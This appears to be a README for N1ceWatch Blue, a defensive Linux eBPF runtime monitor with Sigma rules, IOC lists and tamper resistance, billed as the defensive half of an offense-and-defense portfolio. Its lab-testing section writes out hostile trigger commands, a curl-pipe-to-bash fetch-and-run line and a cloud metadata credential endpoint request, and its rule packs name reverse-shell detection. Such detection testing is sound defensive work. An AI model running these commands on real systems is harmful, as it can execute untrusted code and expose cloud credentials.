# N1ceWatch Blue — System-Wide Linux eBPF Runtime Monitor

> **Blue Team / Authorized Testing Only** — Lightweight EDR-lite agent for Ubuntu 16.04 → 24.04. Detects runtime anomalies (process/file/network/privilege) and generates real-time JSONL + dashboard reports. Tamper-resistant against non-sudo, visible to sudo (Option A).

![N1ceWatch](docs/architecture.png)

*Companion to [N1cedream Webshell](https://github.com/yoelarmando/N1cedream-Webshell) + [Bypass Uploader] — offense + defense portfolio.*

## Features

| Layer | Capability |
|-------|------------|
| **Providers** | eBPF CO-RE (ringbuf) → `auditd` tail → `/proc` poll fallback (BTF auto-probe) — one binary for all Ubuntu |
| **Events** | `process_creation(1)`, `file_event(11)`, `network_connection(3)`, `bpf_event(100)`, `file_time(2)` + `privilege/rename/chmod` |
| **Detection** | Sigma `119` process rules (100%) + file rules + IOC (`c2-iocs.txt`) + `fsnotify` watchers (`cron`, `ld.so.preload`, `systemd`, `sudoers`) + syscall anomaly |
| **Emitter** | `JSONL` to stdout + `/var/log/n1cewatch/events.jsonl` + `UDP/Syslog/HTTP` sinks with spool |
| **Store** | `SQLite3` at `/var/log/n1cewatch.db` + HTTP query API `:8081` |
| **Report** | Real-time Next.js dashboard + periodic HTML compliance (CIS/NIST) |
| **Hardening** | systemd `ProtectSystem=strict`, `NoNewPrivileges`, `CAP_BPF` — non-sudo cannot `kill/stop/rm`, sudo can |

## Quick Start (All Ubuntu)

```bash
# one-liner (requires sudo, kernel >=4.15)
curl -fsSL https://raw.githubusercontent.com/n1cewatch/n1cewatch/main/deploy/install.sh | sudo bash

# or build from source (Ubuntu 22.04+)
sudo apt update && sudo apt install -y clang llvm libbpf-dev linux-headers-$(uname -r) golang-go sqlite3
git clone https://github.com/n1cewatch/n1cewatch && cd n1cewatch
make build
sudo ./bin/n1cewatch --json --store-path /var/log/n1cewatch.db --store-query-port 8081
```

Dashboard: `http://localhost:8081` → `Nginx` proxies to `3000`, API at `:8080`

## Architecture

```
[Kernel 5.8+/BTF || auditd || /proc] -> Provider -> Distributor (LRU correlator + enrich) -> Consumers (Sigma/IOC/fsnotify) -> Emitter (JSONL) -> Store (SQLite) -> Dashboard (Next.js)
```

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)

## CLI

```bash
sudo ./n1cewatch --help
  --json                    JSON output (default text)
  --store-path PATH         SQLite persist (/var/log/n1cewatch.db)
  --store-query-port PORT   HTTP query API (8081)
  --udp-target HOST:PORT    forward JSONL to SIEM
  --rules PATH              Sigma rules dir (packs/anomaly)
  --audit-log PATH          auditd log (auto on <5.8)
  --no-ebpf                 force auditd/proc fallback
  --throttle-rate 1.0       per-rule throttle
```

## Testing on Your Server (Authorized Lab Only)

```bash
# 1. Verify non-sudo cannot tamper
su app -c "kill $(cat /run/n1cewatch.pid)"        # -> Operation not permitted (PASS)
su app -c "systemctl stop n1cewatch"              # -> Access denied (PASS)

# 2. Trigger anomaly (as root/sudo test)
bash -c "curl http://example.com | bash"          # -> Sigma: suspicious curl pipe
curl http://169.254.169.254/latest/meta-data/     # -> Cloud metadata (Sigma)

# 3. Check detection
sudo tail -f /var/log/n1cewatch/events.jsonl | jq
curl http://localhost:8081/api/alerts | jq
curl http://localhost:8081/report.html > report.html
```

## Packs

* `packs/anomaly/sysmon_process.yml` — 119 process rules (reverse shell, base64, java child)
* `packs/anomaly/fsnotify.yml` — cron/ld.preload/systemd watches
* `resources/iocs/c2-iocs.txt` — curated C2 IPs

## License

GPL-3.0 (Aurora upstream). See [LICENSE](LICENSE)
